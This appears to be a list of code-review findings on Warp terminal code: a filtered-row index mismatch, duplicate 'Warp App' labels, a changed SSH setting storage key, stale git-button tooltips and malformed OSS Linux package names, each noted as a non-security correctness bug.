description: CloudModeV2SlashCommandView renders and accepts items using browsing_rows_filtered(..., self.section_filter), but the newly added selected_detail_data() helper uses browsing_rows(...) without applying self.section_filter. When a section filter is active, selected_idx is an index into the filtered visible row list, while selected_detail_data() interprets the same index against the unfiltered row list. As a result, the sidecar may show stale or unrelated title/description text for the selected row. This does not appear to cross a security boundary or cause command execution, authentication bypass, info disclosure, or memory safety issues.

title: Cloud and local agent sources share identical UI label
description: AgentSource::display_name now returns "Warp App" for both AgentSource::Interactive and AgentSource::CloudMode. However, the agent management source dropdown still adds CloudMode and Interactive as separate filter options when the interactive conversation management feature is enabled. This can render two indistinguishable "Warp App" menu entries that select different filters, and metadata rows can no longer tell users whether a run came from a local interactive agent or cloud mode. This is a UI/UX correctness issue, not a security vulnerability.

title: SSH install setting migration changes storage key
description: This commit wraps the existing SshExtensionInstallMode enum in a new maybe_define_setting-generated setting named SshExtensionInstallModeSetting. Because no explicit storage_key is supplied, the settings macro derives the storage key from the new wrapper type name. The previous implement_setting_for_enum invocation used the enum name itself as the storage key: SshExtensionInstallMode. The settings trait explicitly requires storage keys not to change over time, and non-settings-file preferences plus cloud preference registration/sync use storage_key rather than the TOML key. As a result, users' existing SSH extension install-mode preference may be silently lost or duplicated under a new cloud/local key. The TOML path remains unchanged, so users already on the settings-file backend are less affected locally, but cloud sync and fallback/native preferences still use the changed storage key.

title: Stale tooltips persist on enabled git buttons
description: The new tooltip state is set when the primary git action is in Commit mode, using `disabled.then_some(...)`. However, when the UI later transitions to Push, Create PR, View PR, or Publish modes, those branches set the button enabled but do not clear the tooltip. `ActionButton::set_disabled(false)` does not clear tooltip state, so an enabled Push/PR/Publish button can still show stale text such as "No changes to commit" or the enabled chevron can still show "No git actions available". This is a UI correctness bug and does not create a security vulnerability.

title: OSS Linux CLI packages get malformed names
description: For Linux OSS CLI builds, `script/linux/bundle` now intentionally leaves `BINARY_NAME` as `warp-oss` instead of rewriting `warp` to `oz`. However, the Linux packaging scripts still derive `CHANNEL_SUFFIX` for CLI artifacts by stripping an `oz` prefix from `BINARY_NAME`. Because `warp-oss` does not start with `oz`, the suffix becomes the whole string `warp-oss`, producing package/repository names such as `ozwarp-oss`, `warpdotdevwarp-oss`, or `warp-terminalwarp-oss` instead of a coherent OSS CLI package name. This appears to affect build/distribution correctness, not runtime security.
